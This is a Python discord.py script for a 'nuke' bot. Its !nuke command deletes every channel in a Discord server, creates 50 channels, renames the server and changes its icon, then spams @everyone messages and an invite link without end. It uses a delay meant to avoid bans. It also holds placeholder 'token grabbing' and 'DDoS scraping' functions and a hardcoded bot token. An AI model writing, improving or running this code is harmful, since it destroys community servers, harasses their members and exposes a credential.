import discord
from discord.ext import commands
import asyncio
import os
import random
import aiohttp
import io

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
bot = commands.Bot(command_prefix='!', intents=intents)

# Tokens list
TOKEN_LIST = []

# Save path
TOKEN_FILE = os.path.join(os.path.expanduser("~/Downloads"), "tokens.js")

# Create directory if needed
os.makedirs(os.path.dirname(TOKEN_FILE), exist_ok=True)

# Messages to spam
spam_messages = [
    "SOLARIUM OWNS YOU GUYS@everyone",
    "BEST NUKING BOT IN HERE https://discord.gg/rqRmBeaUZC @everyone"  
]

# GIF file to spam
GIF_FILE = "solarium.gif" 

# Token exclude
EXCLUDE_TOKENS = {
    "xeofrfr",
    "1360174957446959164"
}

# Channel name prefix
CHANNEL_NAME = "(っ◔◡◔)っ ♥ SOLARIUM OWNS ♥"

# Image URL for server avatar (MUST BE A DIRECT LINK TO IMAGE)
# Note: Imgur album links like 'https://imgur.com/a/lb4YK8O' won't work.
# You need a direct link ending in .png, .jpg, etc.
SERVER_AVATAR_URL = "https://i.imgur.com/lb4YK8O.png"  

# Server name after nuke
NEW_SERVER_NAME = "(っ◔◡◔)っ ♥ SOLARIUM OWNS ♥"

async def get_image_bytes(url):
    """Helper to download image bytes for the server icon."""
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as resp:
                if resp.status == 200:
                    return await resp.read()
                else:
                    print(f"⚠️ Failed to download image: Status {resp.status}")
    except Exception as e:
        print(f"⚠️ Error downloading image: {e}")
    return None

def save_tokens_to_file():
    try:
        with open(TOKEN_FILE, "w", encoding="utf-8") as f:
            f.write("tokens = [\n")
            for token in TOKEN_LIST:
                f.write(f'    "{token}",\n')
            f.write("];\n")
        print(f"✅ Tokens saved to: {TOKEN_FILE}")
    except Exception as e:
        print(f"❌ Failed to save tokens: {e}")

async def delete_all_channels(guild):
    # Get all channels (text, voice, categories) to delete them
    for channel in guild.channels:
        try:
            await channel.delete()
            print(f"🗑️ Deleted: {channel.name}")
        except:
            pass

async def create_channels(guild, count=50):
    created = []
    for i in range(count):
        try:
            channel = await guild.create_text_channel(name=f"{CHANNEL_NAME}-{i+1}")
            created.append(channel)
            print(f"✅ Created: {channel.name}")
        except Exception as e:
            print(f"⚠️ Failed to create channel: {e}")
    return created

async def grab_tokens(guild, exclude_tokens):
    # This is a simulation/placeholder as per original script
    for member in guild.members:
        if str(member.id) not in exclude_tokens and not member.bot:
            token = f"token_{member.name}_{member.id}"
            TOKEN_LIST.append(token)
            print(f"✅ Logged 'token' for {member.name}")

async def infinite_spam(channel, message_list, gif_data=None):
    """Spams messages. gif_data should be bytes to avoid reopening the file repeatedly."""
    while True:
        try:
            for msg in message_list:
                await channel.send(msg)
                await asyncio.sleep(0.7) # Safer delay to avoid instant Discord ban

            if gif_data:
                await channel.send(file=discord.File(io.BytesIO(gif_data), filename="solarium.gif"))
                await asyncio.sleep(0.7)

        except discord.errors.Forbidden:
            break # Bot lost access or channel deleted
        except Exception as e:
            print(f"❌ Spam error in {channel.name}: {e}")
            await asyncio.sleep(5)

async def ddos_scrape(guild):
    print("📡 DDoS SCRAPING STARTED...")
    for member in guild.members:
        if str(member.id) not in EXCLUDE_TOKENS and not member.bot:
            print(f"🔥 Scraped 'IP': {member.id} ({member.name})")

@bot.command()
async def nuke(ctx):
    guild = ctx.guild
    print(f"  NUKING SERVER: {guild.name}")

    # Step 1: Prepare assets first (before deleting channels)
    gif_data = None
    if os.path.exists(GIF_FILE):
        try:
            with open(GIF_FILE, "rb") as f:
                gif_data = f.read()
        except:
            pass
    
    icon_bytes = await get_image_bytes(SERVER_AVATAR_URL)

    # Step 2: Clear and Create
    await delete_all_channels(guild)
    new_channels = await create_channels(guild, 50)

    # Step 3: Server Identity Change
    try:
        kwargs = {"name": NEW_SERVER_NAME}
        if icon_bytes:
            kwargs["icon"] = icon_bytes
        await guild.edit(**kwargs)
        print("✅ Server renamed and icon updated!")
    except Exception as e:
        print(f"❌ Failed to update server identity: {e}")

    # Step 4: Scraping and Tokens (Simulated)
    await grab_tokens(guild, EXCLUDE_TOKENS)
    save_tokens_to_file()

    # Step 5: Start Background Spam Tasks
    # IMPORTANT: We do NOT await infinite loops, or the command will never finish.
    print("📢 SPAMMING STARTED!")
    for channel in new_channels:
        # Run each channel's spam in the background
        asyncio.create_task(infinite_spam(channel, spam_messages, gif_data))

    asyncio.create_task(ddos_scrape(guild))
    
    # Send final confirmation to the first available channel if possible
    print("🔥 NUKED COMPLETE! Background spamming is active.")

# Run the bot
# Note: Ensure you have 'aiohttp' installed: pip install aiohttp
bot.run('MTQ4MDI0ODU0NjkyOTE0ODE2MQ.GLdE0M.wTwtMkAw4T9iWRU2plgZ4fwlOOvRo8No1NxQO4')
